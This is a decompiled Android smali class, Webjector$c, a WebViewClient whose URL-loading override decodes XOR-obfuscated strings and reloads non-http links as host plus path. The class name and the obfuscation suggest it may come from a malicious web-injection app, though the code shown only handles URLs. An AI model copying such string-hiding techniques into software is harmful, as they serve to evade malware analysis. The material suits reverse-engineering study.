.class Lcom/icontrol/protector/Webjector$c;
.super Landroid/webkit/WebViewClient;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/icontrol/protector/Webjector;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "c"
.end annotation


# instance fields
.field final synthetic a:Lcom/icontrol/protector/Webjector;


# direct methods
.method private constructor <init>(Lcom/icontrol/protector/Webjector;)V
    .locals 0

    .line 1
    iput-object p1, p0, Lcom/icontrol/protector/Webjector$c;->a:Lcom/icontrol/protector/Webjector;

    invoke-direct {p0}, Landroid/webkit/WebViewClient;-><init>()V

    return-void
.end method

.method synthetic constructor <init>(Lcom/icontrol/protector/Webjector;Lcom/icontrol/protector/Webjector$a;)V
    .locals 0

    .line 2
    invoke-direct {p0, p1}, Lcom/icontrol/protector/Webjector$c;-><init>(Lcom/icontrol/protector/Webjector;)V

    return-void
.end method


# virtual methods
.method public shouldOverrideUrlLoading(Landroid/webkit/WebView;Landroid/webkit/WebResourceRequest;)Z
    .locals 4

    const/4 v0, 0x0

    if-eqz p2, :cond_1

    invoke-interface {p2}, Landroid/webkit/WebResourceRequest;->getUrl()Landroid/net/Uri;

    move-result-object v1

    if-eqz v1, :cond_1

    invoke-interface {p2}, Landroid/webkit/WebResourceRequest;->getUrl()Landroid/net/Uri;

    move-result-object p2

    invoke-virtual {p2}, Landroid/net/Uri;->toString()Ljava/lang/String;

    move-result-object p2

    const/4 v1, 0x7

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p2, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_0

    return v0

    :cond_0
    const/4 v1, 0x4

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v3, v2, [B

    fill-array-data v3, :array_3

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p2, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_1

    const/4 v1, 0x3

    new-array v1, v1, [B

    fill-array-data v1, :array_4

    new-array v3, v2, [B

    fill-array-data v3, :array_5

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p2, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_1

    :try_start_0
    new-instance v1, Ljava/net/URI;

    invoke-direct {v1, p2}, Ljava/net/URI;-><init>(Ljava/lang/String;)V

    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1}, Ljava/net/URI;->getHost()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/net/URI;->getPath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p1, 0x1

    return p1

    :catch_0
    const/16 p1, 0x9

    new-array p1, p1, [B

    fill-array-data p1, :array_6

    new-array p2, v2, [B

    fill-array-data p2, :array_7

    invoke-static {p1, p2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    const/16 p1, 0x1e

    new-array p1, p1, [B

    fill-array-data p1, :array_8

    new-array p2, v2, [B

    fill-array-data p2, :array_9

    invoke-static {p1, p2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    :cond_1
    return v0

    nop

    :array_0
    .array-data 1
        0x7dt
        -0x55t
        -0x2t
        0x62t
        -0x34t
        -0x68t
        0x33t
    .end array-data

    :array_1
    .array-data 1
        0x1bt
        -0x3et
        -0x6et
        0x7t
        -0xat
        -0x49t
        0x1ct
        0x70t
    .end array-data

    :array_2
    .array-data 1
        0x5ft
        -0x79t
        -0x79t
        0x12t
    .end array-data

    :array_3
    .array-data 1
        0x37t
        -0xdt
        -0xdt
        0x62t
        -0x35t
        -0x46t
        0x78t
        -0x17t
    .end array-data

    :array_4
    .array-data 1
        -0x62t
        0x57t
        -0x2ct
    .end array-data

    :array_5
    .array-data 1
        -0x5ct
        0x78t
        -0x5t
        -0x61t
        0x76t
        0x5bt
        -0x77t
        0x22t
    .end array-data

    :array_6
    .array-data 1
        -0x61t
        0x12t
        0x1dt
        -0x1t
        -0x36t
        -0x5dt
        -0x4ft
        0x6ft
        -0x46t
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x38t
        0x77t
        0x7ft
        -0x6bt
        -0x51t
        -0x40t
        -0x3bt
        0x0t
    .end array-data

    :array_8
    .array-data 1
        0x7bt
        -0x64t
        -0x3ft
        0x11t
        0x2bt
        0x5at
        -0x54t
        0x3et
        0x6dt
        -0x7at
        -0x24t
        0xdt
        0x23t
        0x5bt
        -0x4at
        0x3at
        0x64t
        -0x48t
        -0x3ft
        0x5t
        0x23t
        0x57t
        -0x73t
        0x2ft
        0x28t
        -0x6ft
        -0x24t
        0x16t
        0x28t
        0x4ct
    .end array-data

    nop

    :array_9
    .array-data 1
        0x8t
        -0xct
        -0x52t
        0x64t
        0x47t
        0x3et
        -0x1dt
        0x48t
    .end array-data
.end method
